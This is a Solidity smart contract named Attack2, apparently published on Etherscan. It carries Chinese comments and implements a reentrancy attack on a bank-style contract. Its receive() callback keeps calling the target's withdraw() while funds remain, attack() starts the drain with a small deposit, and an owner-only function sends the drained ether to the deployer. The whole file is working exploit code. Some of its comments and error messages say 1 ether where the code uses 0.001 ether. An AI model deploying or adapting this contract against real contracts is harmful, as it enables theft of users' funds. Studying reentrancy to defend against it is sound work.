/**
 *Submitted for verification at Etherscan.io on 2022-11-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBANK {
    function balanceOf(address) external view returns (uint256);
    function deposit() external payable;
    function getBalance() external view returns (uint256);
    function withdraw() external;
}

contract Ownable {

  address public owner;

  modifier onlyOwner() {
    require(msg.sender == owner, "only for owner");
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    owner = newOwner;
  }

}
 
contract Attack2 is Ownable {
    IBANK public bank; // Bank合约地址
    // 定义事件
    event Received(address Sender, uint Value);
    event fallbackCalled(address Sender, uint Value, bytes Data);
    
    // 初始化Bank合约地址
    constructor(IBANK _bank) {
        owner = msg.sender;
        bank = _bank;
    }

    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        emit Received(msg.sender, msg.value);
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // fallback
    fallback() external payable{
        emit fallbackCalled(msg.sender, msg.value, msg.data);
    }
    
    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 0.001 ether, "Require 1 ether to attack");
        bank.deposit{value: 0.001 ether}();
        bank.withdraw();
    }


    //单独调用存款
    function depositBank() external payable {
         bank.deposit{value: 1 ether}();
    }
    
    //单独调用提币
    function withdrawBank() external {
        bank.withdraw();
    }

    // 提取合约的全部余额
    function withdrawContract() onlyOwner external {
        // 获取余额
        uint256 balance = address(this).balance;
        require(balance > 0, "Insufficient balance");
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Failed to withdraw Contract balance");
    }

    // 获取合约的余额
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getBankBalance() external view returns (uint256){
        return bank.getBalance();
    }
}